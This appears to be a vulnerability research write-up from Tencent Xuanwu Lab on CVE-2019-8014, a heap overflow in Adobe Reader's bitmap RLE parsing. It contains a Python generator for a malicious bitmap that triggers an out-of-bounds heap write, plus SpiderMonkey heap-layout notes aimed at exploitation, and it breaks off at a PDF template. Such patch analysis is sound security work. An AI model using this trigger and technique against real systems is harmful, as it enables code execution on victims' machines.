@@ -1,0 +1,1714 @@
+腾讯玄武实验室
+首页 安全公告 披露原则 关于 English
+深入分析Adobe忽略了6年的PDF漏洞
+2019-09-12
+本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前修复了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。
+
+本文作者：Ke Liu of Tencent Security Xuanwu Lab
+
+0x01. 漏洞简介
+Adobe 在八月份为 Adobe Acrobat and Reader 发布了安全公告 APSB19-41 ，和往常一样，这次更新修复了大量漏洞。当笔者在 ZDI 上查看对应的漏洞公告时，目光迅速被 ZDI-19-725 / CVE-2019-8014 所吸引，因为模块 AcroForm 中 Bitmap 解析相关的漏洞非常少见。该漏洞在 ZDI 上的部分公告信息如下：
+
+Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability
+
+The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.
+
+看描述这和六年之前修复的漏洞 CVE-2013-2729 非常相似——都和 XFA Bitmap Run Length Encoding 解析有关！实际上，两个漏洞之间确实有着千丝万缕的联系，本文将详细分析漏洞的原理以及两者之间的关系。
+
+漏洞 CVE-2019-8014 在 ZDI 上的致谢信息为 ktkitty (https://ktkitty.github.io) 。
+
+0x02. 环境搭建
+根据官方公告 APSB19-41 的描述，该漏洞影响 2019.012.20035 以及更早版本的 Adobe Acrobat and Reader ，而不受影响的最新版本号为 2019.012.20036 。本文基于前者进行漏洞分析、基于后者进行补丁分析。
+
+安装 Adobe Acrobat Reader DC 2019.012.20035 的步骤如下：
+
+下载并安装 2019.012.20034 (下载链接)
+升级到 2019.012.20035 (下载链接)
+安装 Adobe Acrobat Reader DC 2019.012.20036 的步骤如下：
+
+下载并安装 2019.012.20036 (下载链接)
+在调试环境中安装好软件后，记得禁用更新服务 Adobe Acrobat Update Service 或者直接断开网络连接，防止 Adobe Acrobat Reader DC 自动更新。
+
+0x03. 位图简介
+在进行漏洞分析之前，先简单介绍一下位图的结构。如果你对位图已经非常熟悉，那么可以直接跳过本小节内容。
+
+3.1 相关结构
+通常来说，位图文件由以下四部分构成：
+
+Bitmap File Header
+Bitmap Info Header
+RGBQUAD Array
+Bitmap Data
+3.1.1 Bitmap File Header
+结构体 BITMAPFILEHEADER 的定义如下：
+
+1
+2
+3
+4
+5
+6
+7
+typedef struct tagBITMAPFILEHEADER {
+  WORD  bfType;         // 文件标记 'BM'
+  DWORD bfSize;         // 位图文件的大小
+  WORD  bfReserved1;    // 保留字段 0
+  WORD  bfReserved2;    // 保留字段 0
+  DWORD bfOffBits;      // 位图数据在文件中的偏移值
+} BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;
+3.1.2 Bitmap Info Header
+结构体 BITMAPINFOHEADER 的定义如下：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+typedef struct tagBITMAPINFOHEADER {
+  DWORD biSize;             // 结构体的大小
+  LONG  biWidth;            // 位图宽度
+  LONG  biHeight;           // 位图高度
+  WORD  biPlanes;           // 必须为 1
+  WORD  biBitCount;         // 每个像素所占用的位数
+  DWORD biCompression;      // 压缩算法
+  DWORD biSizeImage;        // 数据大小
+  LONG  biXPelsPerMeter;    // 水平分辨率
+  LONG  biYPelsPerMeter;    // 垂直分辨率
+  DWORD biClrUsed;          // 色彩索引数
+  DWORD biClrImportant;     // 必须的色彩索引数
+} BITMAPINFOHEADER, *PBITMAPINFOHEADER;
+这里成员 biCompression 指明了位图所使用的压缩算法，部分压缩算法的定义如下：
+
+1
+2
+3
+4
+#define BI_RGB  0  // 未使用压缩算法
+#define BI_RLE8 1  // RLE8 压缩算法
+#define BI_RLE4 2  // RLE4 压缩算法
+// 其他压缩算法...
+3.1.3 RGBQUAD Array
+结构体 RGBQUAD 描述一个像素的色彩组成，其定义如下：
+
+1
+2
+3
+4
+5
+6
+typedef struct tagRGBQUAD {
+  BYTE rgbBlue;
+  BYTE rgbGreen;
+  BYTE rgbRed;
+  BYTE rgbReserved;
+} RGBQUAD;
+RGBQUAD Array 代表了一张色彩表，位图数据在解析之后可以是一个索引，索引在数组中对应的值便是该像素的色彩表示。该数组的长度取决于结构体 BITMAPINFOHEADER 中的 biBitCount 和 biClrUsed 成员的值。
+
+3.1.4 Bitmap Data
+位图的位数据，该部分数据的表现形式取决于位图所使用的压缩算法。
+
+有一点需要注意的是：位图数据是从左下角往右上角方向进行填充的，即位图数据中解析出来的第一个像素的色彩，应当填充到位图的左下角 [wikipedia]，随后依次填充当前行的像素，当前行填充完毕之后，往上移动一个像素继续以行位单位进行填充，直到位图填充完毕。
+
+3.2 RLE 编码
+位图支持两种类型的 RLE（Run Length Encoding）压缩算法：RLE4 和 RLE8 。
+
+3.2.1 RLE8 编码
+RLE8 压缩算法用于压缩 8 位位图（即每个像素占用 1 字节空间）。RLE8 压缩后的数据可以处于 编码模式（Encoded Mode） 和 绝对模式（Absolute Mode） 中的任意一种（两种模式在同一个位图中可以同时出现）。
+
+编码模式 包含两字节数据：
+
+如果第一个字节不为零，其含义为第二个字节需要重复的次数
+如果第一个字节为零，那么第二个字节的可能含义如下
+0x00 表示当前行已经结束
+0x01 表示位图解析完毕
+0x02 表示接下来的两个字节 (deltaX, deltaY) 为当前坐标 (x, y) 需要移动的距离
+在 绝对模式 中，第一个字节为零，第二个字节位于区间 [0x03, 0xFF] 。第二个字节表示接下来特定数量的字节是未压缩的数据（数据量需要按 WORD 对齐）。
+
+下面为 RLE8 压缩之后的数据：
+
+1
+2
+[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]
+[02 78] [00 00] [09 1E] [00 01]
+下面为解压之后的数据：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+04 04 04
+06 06 06 06 06
+45 56 67
+78 78
+move current position 5 right and 1 up
+78 78
+end of line
+1E 1E 1E 1E 1E 1E 1E 1E 1E
+end of RLE bitmap
+3.2.2 RLE4 编码
+RLE4 压缩算法用于压缩 4 位位图（即每个像素占用半字节空间）。RLE4 压缩后的数据可以处于 编码模式（Encoded Mode） 和 绝对模式（Absolute Mode） 中的任意一种（两种模式在同一个位图中可以同时出现）。
+
+编码模式 包含两字节数据：
+
+如果第一个字节不为零，其含义为第二个字节展开后得到的像素个数
+
+第二个字节代表了两个像素的色彩索引
+高 4 位代表第一个像素的色彩索引
+低 4 位代表第二个像素的色彩索引
+二者依次交替重复，直到得到第一个字节指定的像素个数
+如果第一个字节为零，那么第二个字节的可能含义如下
+
+0x00 表示当前行已经结束
+0x01 表示位图解析完毕
+0x02 表示接下来的两个字节 (deltaX, deltaY) 为当前坐标 (x, y) 需要移动的距离
+在 绝对模式 中，第一个字节为零，第二个字节位于区间 [0x03, 0xFF] 。第二个字节表示接下来特定数量的 半字节 是未压缩的数据（数据量需要按 WORD 对齐）。
+
+下面为 RLE4 压缩之后的数据：
+
+1
+2
+[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]
+[04 78] [00 00] [09 1E] [00 01]
+下面为解压之后的数据：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+0 4 0
+0 6 0 6 0
+4 5 5 6 6 7
+7 8 7 8
+move current position 5 right and 1 up
+7 8 7 8
+end of line
+1 E 1 E 1 E 1 E 1
+end of RLE bitmap
+0x04. 漏洞分析
+4.1 代码定位
+根据 ZDI 网站上的公告信息，可知漏洞位于 AcroForm 模块。该模块是 Adobe Acrobat Reader DC 中负责处理 XFA 表单 的插件，其路径如下：
+
+1
+%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api
+通常来说，借助 BinDiff 进行补丁对比分析可以快速定位到有漏洞的函数，但如果新旧版本的二进制文件变动比较大的话就不太好处理了，模块 AcroForm.api 的情况便是如此：通过对比发现有大量函数进行了改动，一个一个去看显然不太现实。
+
+笔者用于定位漏洞函数的方法如下（以 2019.012.20035 为例）：
+
+在 IDA 中搜索字符串 PNG ，在 .rdata:20F9A374 找到一处定义
+对 20F9A374 进行交叉引用查找，定位到函数 sub_20CF3A3F
+很显然函数 sub_20CF3A3F 负责判断图片的类型（从这里也可以看出 XFA 表单所支持的图片格式类型）
+对 sub_20CF3A3F 进行交叉引用查找，定位到函数 sub_20CF4BE8
+函数 sub_20CF4BE8 根据图片的类型调用不同的处理函数
+函数 sub_20CF4870（跳转自 sub_20CF3E5F）负责处理 BMP 位图
+在 BinDiff 的结果中可以看到，函数 sub_20CF3E5F 中确实有几个基本块发生了变动，比如 20CF440F 处的基本块的变动情况如下：
+
+1
+2
+3
+4
+5
+6
+7
+8
+// 20CF440F in AcroForm 2019.012.20035
+if ( v131 >= v26 || (unsigned __int8)v127 + v43 > v123 )
+  goto LABEL_170;
+
+// 20CF501F in AcroForm 2019.012.20036
+v56 = (unsigned __int8)v130 + v43;
+if ( v134 >= v26 || v56 > v126 || v56 < v43 || v56 < (unsigned __int8)v130 )
+  goto LABEL_176;
+很明显，这里增加了对整数溢出的判断。
+
+4.2 漏洞分析
+好在网上已经有了针对 CVE-2013-2729 的详细分析报告（参考 feliam’s write up for CVE-2013-2729），基于此可以快速理解函数 sub_20CF3E5F 中相关代码的含义。
+
+4.2.1 RLE8 解析
+函数 sub_20CF3E5F 中负责解析 RLE8 压缩数据的部分代码如下：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+if ( bmih.biCompression == 1 )  // RLE8 算法
+{
+  xpos = 0;                     // unsigned int, 从左往右
+  ypos = bmih.biHeight - 1;     // unsigned int, 从下往上
+  bitmap_ends = 0;
+  result = fn_feof(v1[2]);
+  if ( !result )
+  {
+    do
+    {
+      if ( bitmap_ends )
+        return result;
+      fn_read_bytes(v1[2], &cmd, 2u);           // 读取 2 字节数据
+      if ( (_BYTE)cmd )                         // 第一个字节不为零
+      {                                         // 表示有压缩数据等待处理
+        // 20CF440F 变动的基本块之一
+        if ( ypos >= height || (unsigned __int8)cmd + xpos > width )
+          goto LABEL_170;                       // CxxThrowException
+        index = 0;
+        if ( (_BYTE)cmd )
+        {
+          do
+          {
+            line = (_BYTE *)fn_get_scanline(v1[3], ypos);
+            line[xpos++] = BYTE1(cmd);
+            ++index;
+          }
+          while ( index < (unsigned __int8)cmd ); // 展开数据
+        }
+      }
+      else if ( BYTE1(cmd) )        // 第一字节为零且第二字节不为零
+      {
+        if ( BYTE1(cmd) == 1 )      // 位图结束
+        {
+          bitmap_ends = 1;
+        }
+        else if ( BYTE1(cmd) == 2 ) // delta 数据
+        {
+          fn_read_bytes(v1[2], &xdelta, 1u);
+          fn_read_bytes(v1[2], &ydelta, 1u);
+          xpos += xdelta;           // 向右移动
+          ypos -= ydelta;           // 向上移动
+        }
+        else                        // 未压缩数据
+        {
+          dst_xpos = BYTE1(cmd) + xpos;
+          if ( ypos >= height || dst_xpos < xpos || 
+               dst_xpos < BYTE1(cmd) || dst_xpos > width )  // 整数溢出检查
+            goto LABEL_170;         // CxxThrowException
+          index = 0;
+          if ( BYTE1(cmd) )
+          {
+            do
+            {
+              fn_read_bytes(v1[2], &value, 1u);
+              line = (_BYTE *)fn_get_scanline(v1[3], ypos);
+              line[xpos++] = value;
+              count = BYTE1(cmd);
+              ++index;
+            }
+            while ( index < BYTE1(cmd) );   // 读取未压缩数据
+          }
+          if ( count & 1 )                  // 数据对齐
+            fn_read_bytes(v1[2], &value, 1u);
+        }
+      }
+      else                                  // 当前行结束
+      {
+        --ypos;                             // 从下往上移动一行
+        xpos = 0;                           // 移动到行的起点
+      }
+      result = fn_feof(v1[2]);
+    }
+    while ( !result );
+  }
+}
+基于前面的补丁分析，很明显下面的 if 语句中存在整数溢出：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+// 20CF440F 变动的基本块之一
+if ( ypos >= height || (unsigned __int8)cmd + xpos > width )
+  goto LABEL_170;                       // CxxThrowException
+
+// 20CF501F AcroForm 2019.012.20036 中修复的基本块
+dst_xpos = (unsigned __int8)cmd + xpos;
+if ( ypos >= height || dst_xpos > width || 
+     dst_xpos < xpos || dst_xpos < (unsigned __int8)cmd )
+  goto LABEL_176;
+这里在计算 (unsigned __int8)cmd + xpos 时可能导致整数溢出，且其中两个变量的值都可以被控制。在解析特定的 RLE8 数据时，如果触发这里的整数溢出，后续便可以实现堆块越界写。
+
+变量 (unsigned __int8)cmd 的值是可以直接控制的，其取值范围为 [1, 255]
+1
+fn_read_bytes(v1[2], &cmd, 2u);           // 读取 2 字节数据
+变量 xpos 的值也是可以直接控制的，只需要在 编码模式 中布局大量 delta 命令即可使得 xpos 的值接近 0xFFFFFFFF
+1
+2
+3
+4
+5
+6
+7
+else if ( BYTE1(cmd) == 2 ) // delta
+{
+  fn_read_bytes(v1[2], &xdelta, 1u);
+  fn_read_bytes(v1[2], &ydelta, 1u);
+  xpos += xdelta;           // 向右移动, xdelta 取值范围为 [0, 255]
+  ypos -= ydelta;           // 向上移动
+}
+因为 xpos 非常大（有符号表示为负数），因此在处理 RLE8 压缩数据时可以实现堆块越界写（往低地址方向越界写），并且写的数据也是完全可控的，只不过所有数据都必须是同样的值
+1
+2
+3
+4
+5
+6
+7
+8
+index = 0;
+do
+{
+  line = (_BYTE *)fn_get_scanline(v1[3], ypos);
+  line[xpos++] = BYTE1(cmd);            // 可控数据实现堆块越界写
+  ++index;
+}
+while ( index < (unsigned __int8)cmd ); // 解压数据
+4.2.2 RLE4 解析
+函数 sub_20CF3E5F 中负责解析 RLE4 压缩数据的部分代码如下（实现 RLE4 解压的代码比 RLE8 解压的代码稍微复杂一点，因为数据单位不再是一个字节，而是半个字节）：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+if ( bmih.biCompression == 2 )  // RLE4 算法
+{
+  xpos = 0;                     // unsigned int, 从左往右
+  ypos = bmih.biHeight - 1;     // unsigned int, 从下往上
+  bitmap_ends = 0;
+  odd_index_ = 0;
+  if ( !fn_feof(v1[2]) )
+  {
+    do
+    {
+      if ( bitmap_ends )
+        return result;
+      fn_read_bytes(v1[2], &cmd, 2u);       // 读取 2 字节数据
+      if ( (_BYTE)cmd )                     // 第一个字节不为零
+      {                                     // 表示有压缩数据等待处理
+        high_4bits = BYTE1(cmd) >> 4;       // 高 4 位数据
+        low_4bits = BYTE1(cmd) & 0xF;       // 低 4 位数据
+        // 20CF45F8 变动的基本块之一
+        if ( ypos >= height || (unsigned __int8)cmd + xpos > width )
+          goto LABEL_170;                   // CxxThrowException
+        index = 0;
+        if ( (_BYTE)cmd )
+        {
+          xpos_ = odd_index_;
+          do
+          {
+            byte_slot = xpos_ >> 1;
+            odd_index = index & 1;
+            line = fn_get_scanline(v1[3], ypos);
+            _4bits = high_4bits;            // 偶数索引 -> 高 4 位数据
+            if ( odd_index )                // 奇数索引 -> 低 4 位数据
+              _4bits = low_4bits;
+            if ( xpos_ & 1 )                // xpos 为奇数, 存入已有字节
+            {
+              line[byte_slot] |= _4bits;
+            }
+            else                            // xpos 为偶数, 存入新的字节
+            {
+              line[byte_slot] = 16 * _4bits;
+            }
+            ++xpos_;
+            index = index + 1;
+          }
+          while ( index < (unsigned __int8)cmd );
+          odd_index_ = xpos_;
+          xpos = odd_index_;
+        }
+      }
+      else if ( BYTE1(cmd) )                // 第一字节为零且第二字节不为零
+      {
+        if ( BYTE1(cmd) == 1 )              // 位图结束
+        {
+          bitmap_ends = 1;
+        }
+        else if ( BYTE1(cmd) == 2 )         // delta 数据
+        {
+          fn_read_bytes((_DWORD *)v1[2], &xdelta, 1u);
+          fn_read_bytes((_DWORD *)v1[2], &ydelta, 1u);
+          xpos += xdelta;                   // 向右移动
+          ypos -= ydelta;                   // 向上移动
+          odd_index_ = xpos;
+        }
+        else
+        {
+          // 20CF44EA 变动的基本块之一
+          if ( ypos >= height || BYTE1(cmd) + xpos > width )
+            goto LABEL_170;                 // CxxThrowException
+          index = 0;
+          odd_index = 0;
+          if ( BYTE1(cmd) )                 // 未压缩数据
+          {
+            xpos_ = odd_index_;
+            do
+            {
+              odd_index_ = index & 1;
+              if ( !(index & 1) )           // 读取 1 字节数据
+              {
+                fn_read_bytes((_DWORD *)v1[2], &value, 1u);
+                low_4bits_ = value & 0xF;   // 低 4 位数据
+                high_4bits_ = value >> 4;   // 高 4 位数据
+              }
+              byte_slot = xpos_ >> 1;
+              line = fn_get_scanline(v1[3], ypos);
+              _4bits = high_4bits_;
+              if ( odd_index_ )
+                _4bits = low_4bits_;
+              if ( xpos_ & 1 )
+              {
+                line[byte_slot] |= _4bits;
+              }
+              else
+              {
+                line[byte_slot] = 16 * _4bits;
+              }
+              ++xpos_;
+              count = BYTE1(cmd);
+              not_ended = odd_index++ + 1 < BYTE1(cmd);
+              index = odd_index;
+            }
+            while ( not_ended );
+            odd_index_ = xpos_;
+            xpos = odd_index_;
+          }
+          if ( (count & 3u) - 1 <= 1 )      // 数据对齐
+            fn_read_bytes(v1[2], &value, 1u);
+        }
+      }
+      else                                  // 当前行结束
+      {
+        --ypos;                             // 从下往上移动一行
+        xpos = 0;                           // 移动到行的起点
+        odd_index_ = 0;
+      }
+      result = fn_feof((_DWORD *)v1[2]);
+    }
+    while ( !result );
+  }
+}
+这里在两个位置可以触发整数溢出，其中一处位于处理压缩数据的过程中：
+
+1
+2
+3
+4
+5
+high_4bits = BYTE1(cmd) >> 4;       // 高 4 位数据
+low_4bits = BYTE1(cmd) & 0xF;       // 低 4 位数据
+// 20CF45F8 变动的基本块之一
+if ( ypos >= height || (unsigned __int8)cmd + xpos > width )
+  goto LABEL_170;                   // CxxThrowException
+另一处位于处理未压缩数据的过程中：
+
+1
+2
+3
+// 20CF44EA 变动的基本块之一
+if ( ypos >= height || BYTE1(cmd) + xpos > width )
+  goto LABEL_170;                 // CxxThrowException
+0x05. 漏洞利用
+5.1 溢出目标
+前面提到在解析 RLE 数据时发现了 3 个溢出点，这里选择其中相对容易写利用的溢出点来触发漏洞：位于 RLE8 数据解析过程中的一处整数溢出。
+
+RLE4 数据解析过程中存在的两处溢出点很难实现稳定利用，因为在向扫描线填充像素数据时，偏移值为 xpos 的值除以 2 ，此时偏移值最大可以是 0xFFFFFFFF / 2 = 0x7FFFFFFF ，也就意味着仅能向高地址方向实现堆块越界写，而且这个地址上具体是什么数据很难控制。
+
+而 RLE8 数据解析过程中存在的溢出点就相对好控制一些，因为在向扫描线填充像素数据时，偏移值就是 xpos 本身，这样就可以向低地址方向实现堆块越界写，而且越界写的范围在一定程度上也是可控的。在下面的代码中，(unsigned __int8)cmd 的最大值可以是 0xFF ，为了绕过 if 语句中的条件检查，xpos 的最小值是 0xFFFFFF01 （在有符号类型下表示为 -255）。这也就意味着最大可以向低地址方向越界写 0xFF 字节的数据。
+
+1
+2
+3
+// 20CF440F 变动的基本块之一
+if ( ypos >= height || (unsigned __int8)cmd + xpos > width )
+  goto LABEL_170;                       // CxxThrowException
+但需要注意的是，用于越界写的数据必须是一样的，即只能是同一个字节。这会给漏洞利用带来一些额外的问题，后续会对此进行详细讨论。
+
+1
+2
+3
+4
+5
+6
+7
+8
+index = 0;
+do
+{
+  line = (_BYTE *)fn_get_scanline(v1[3], ypos);
+  line[xpos++] = BYTE1(cmd);
+  ++index;
+}
+while ( index < (unsigned __int8)cmd );
+5.2 SpiderMonkey 基础知识
+Adobe Acrobat Reader DC 所使用的 JavaScript 引擎为 SpiderMonkey ，在编写利用代码之前，先简单介绍一下相关的基础知识。
+
+5.2.1 ArrayBuffer
+对 ArrayBuffer 而言，当 byteLength 的大小超过 0x68 时，其底层数据存储区（backing store）所在的堆块将通过系统堆申请（ucrtbase!calloc）；当 byteLength 的大小小于等于 0x68 时，堆块从 SpiderMonkey 的私有堆 tenured heap 申请。同时，当 backing store 独立申请堆块时，需要额外申请 0x10 字节的空间用于存储 ObjectElements 对象。
+
+1
+2
+3
+4
+5
+6
+7
+8
+class ObjectElements {
+ public:
+  uint32_t flags;               // 可以是任意值，通常为 0
+  uint32_t initializedLength;   // byteLength
+  uint32_t capacity;            // view 对象指针
+  uint32_t length;              // 可以是任意值，通常为 0
+ // ......
+};
+对 ArrayBuffer 而言，这里 ObjectElements 的各个成员的名字是没有意义的（因为本来是为 Array 准备的），这里第二个成员 initializedLength 存储 byteLength 的值，第三个成员 capacity 存储关联的 DataView 对象的指针，其他成员可以是任意值。
+
+在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：
+
+1
+2
+3
+var ab = new ArrayBuffer(0x70);
+var dv = new DataView(ab);
+dv.setUint32(0, 0x41424344, true);
+ArrayBuffer 对象的 backing store 的内存布局如下：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+;            -, byteLength, viewobj,       -,
+34d54f80  00000000 00000070 2458f608 00000000
+;         data
+34d54f90  41424344 00000000 00000000 00000000
+34d54fa0  00000000 00000000 00000000 00000000
+34d54fb0  00000000 00000000 00000000 00000000
+34d54fc0  00000000 00000000 00000000 00000000
+34d54fd0  00000000 00000000 00000000 00000000
+34d54fe0  00000000 00000000 00000000 00000000
+34d54ff0  00000000 00000000 00000000 00000000
+在漏洞利用过程中，如果可以更改 ArrayBuffer 对象的 byteLength 为一个更大的值，那么就可以基于 ArrayBuffer 对象实现越界读写了。不过需要注意后面的 4 字节数据要么为零，要么指向一个 合法 的 DataView 对象，否则进程会立刻崩溃。
+
+5.2.2 Array
+对 Array 而言，当 length 的大小超过 14 时，其底层元素存储区所在的堆块将通过系统堆申请（ucrtbase!calloc）；当 length 的大小小于等于 14 时，堆块从 SpiderMonkey 的私有堆 nursery heap 申请。和 ArrayBuffer 一样，当底层元素存储区独立申请堆块时，需要额外申请 0x10 字节的空间用于存储 ObjectElements 对象。
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+class ObjectElements {
+ public:
+  // The NumShiftedElementsBits high bits of this are used to store the
+  // number of shifted elements, the other bits are available for the flags.
+  // See Flags enum above.
+  uint32_t flags;
+
+  /*
+   * Number of initialized elements. This is <= the capacity, and for arrays
+   * is <= the length. Memory for elements above the initialized length is
+   * uninitialized, but values between the initialized length and the proper
+   * length are conceptually holes.
+   */
+  uint32_t initializedLength;
+
+  /* Number of allocated slots. */
+  uint32_t capacity;
+
+  /* 'length' property of array objects, unused for other objects. */
+  uint32_t length;
+ // ......
+};
+在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：
+
+1
+2
+var array = new Array(15);
+array[0] = array[array.length - 1] = 0x41424344;
+Array 对象元素存储区的内存布局如下：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+0:010> dd 34cb0f88-10 L90/4
+34cb0f78  00000000 0000000f 0000000f 0000000f
+34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]
+34cb0f98  00000000 ffffff84 00000000 ffffff84
+34cb0fa8  00000000 ffffff84 00000000 ffffff84
+34cb0fb8  00000000 ffffff84 00000000 ffffff84
+34cb0fc8  00000000 ffffff84 00000000 ffffff84
+34cb0fd8  00000000 ffffff84 00000000 ffffff84
+34cb0fe8  00000000 ffffff84 00000000 ffffff84
+34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]
+这里 array[0] 和 array[14] 的值都是 41424344 ffffff81 ，其中标签 0xFFFFFF81 表示元素的类型为 INT32 。而 array[1] 到 array[13] 之间的所有元素都被填充为 00000000 ffffff84 ，表示这些元素当前是未定义的（即 undefined ）。
+
+对 Array 而言，如果可以通过触发漏洞更改 capacity 和 length 的值，那么就可以实现越界写操作：仅仅是越界写，因为 initializedLength 不变的话越界读取的元素全部为 undefined ，同时一旦进行越界写操作，initializedLength 之后到越界写之前的所有元素都会被填充为 00000000 ffffff84 ，控制不好的话很容导致进程崩溃。
+
+那么如果同时更改 initializedLength 呢？理论上问题不大，不过对于本文所讨论的漏洞而言不适用，因为 initializedLength 的值会被改成非常大的值（四字节全部为相同的数据），而在 GC 过程中数组的所有元素都会被扫描，进程会因为访问到不可访问的内存页而崩溃。
+
+5.2.3 JSObject
+在 SpiderMonkey 中，所有 JavaScript 对象的类都继承自 JSObject ，后者又继承自 ObjectImpl ，相关定义如下：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+class ObjectImpl : public gc::Cell {
+  protected:
+    HeapPtrShape shape_;
+    HeapPtrTypeObject type_;
+    HeapSlot *slots;
+    HeapSlot *elements;
+  // ......
+};
+
+struct JSObject : public js::ObjectImpl {}
+对某些对象（比如 DataView ）而言， elements 的值是没有意义的，因此会指向一个静态全局变量 emptyElementsHeader ，读取这些对象的 elements 的值可以用于泄露 JavaScript 引擎模块的基地址。
+
+1
+2
+3
+4
+5
+6
+static ObjectElements emptyElementsHeader(0, 0);
+
+/* Objects with no elements share one empty set of elements. */
+HeapSlot *js::emptyObjectElements =
+    reinterpret_cast<HeapSlot *>(uintptr_t(&emptyElementsHeader) + 
+    sizeof(ObjectElements));
+5.3 位图构造
+如下 Python 代码可以用于创建 RLE 类型的位图文件（可以指定各种参数以及位图数据）：
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+import os
+import sys
+import struct
+
+RLE8 = 1
+RLE4 = 2
+COMPRESSION = RLE8
+BIT_COUNT = 8
+CLR_USED = 1 << BIT_COUNT
+WIDTH = 0xF0
+HEIGHT = 1
+
+def get_bitmap_file_header(file_size, bits_offset):
+    return struct.pack('<2sIHHI', 'BM', file_size, 0, 0, bits_offset)
+
+def get_bitmap_info_header(data_size):
+    return struct.pack('<IIIHHIIIIII',
+        0x00000028,
+        WIDTH,
+        HEIGHT,
+        0x0001,
+        BIT_COUNT,
+        COMPRESSION,
+        data_size,
+        0x00000000,
+        0x00000000,
+        CLR_USED,
+        0x00000000)
+
+def get_bitmap_info_colors():
+    # B, G, R, Reserved
+    rgb_quad = '\x00\x00\xFF\x00'
+    return rgb_quad * CLR_USED
+
+def get_bitmap_data():
+    # set ypos to 0 so that we'll be at the beginning of the heap buffer
+    # ypos = (HEIGHT - 1) = 0, no need to bother
+
+    # set xpos to 0xFFFFFF00
+    data = '\x00\x02\xFF\x00' * (0xFFFFFF00 / 0xFF)
+    # set xpos to 0xFFFFFF0C
+    data += '\x00\x02\x0C\x00'
+
+    # 0xFFFFFF0C + 0xF4 = 0
+    # 0xF4 bytes of 0x10
+    data += '\xF4\x10'
+
+    # mark end of bitmap to skip CxxThrowException
+    data += '\x00\x01'
+
+    return data
+
+def generate_bitmap(filepath):
+    data = get_bitmap_data()
+    data_size = len(data)
+
+    bmi_header = get_bitmap_info_header(data_size)
+    bmi_colors = get_bitmap_info_colors()
+
+    bmf_header_size = 0x0E
+    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)
+    file_size = bits_offset + data_size
+    bmf_header = get_bitmap_file_header(file_size, bits_offset)
+    with open(filepath, 'wb') as f:
+        f.write(bmf_header)
+        f.write(bmi_header)
+        f.write(bmi_colors)
+        f.write(data)
+
+if __name__ == '__main__':
+    if len(sys.argv) != 2:
+        print 'Usage: %s <output.bmp>' % os.path.basename(sys.argv[0])
+        sys.exit(1)
+    generate_bitmap(sys.argv[1])
+这里直接创建一个 RLE8 位图文件，相关参数如下：
+
+宽度为 0xF0
+高度为 1
+位数为 8
+对该位图而言，用于存储位图数据的堆块的大小将会是 0xF0 ，而函数 get_bitmap_data 中指定的位图数据将使得我们可以向低地址方向越界写 0xF4 字节的数据，其中数据全部为 0x10 。
+
+5.4 PDF 构造
+下面是一个 PDF 模板文件的内容，该模板后续将用于生成 POC 文件。
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
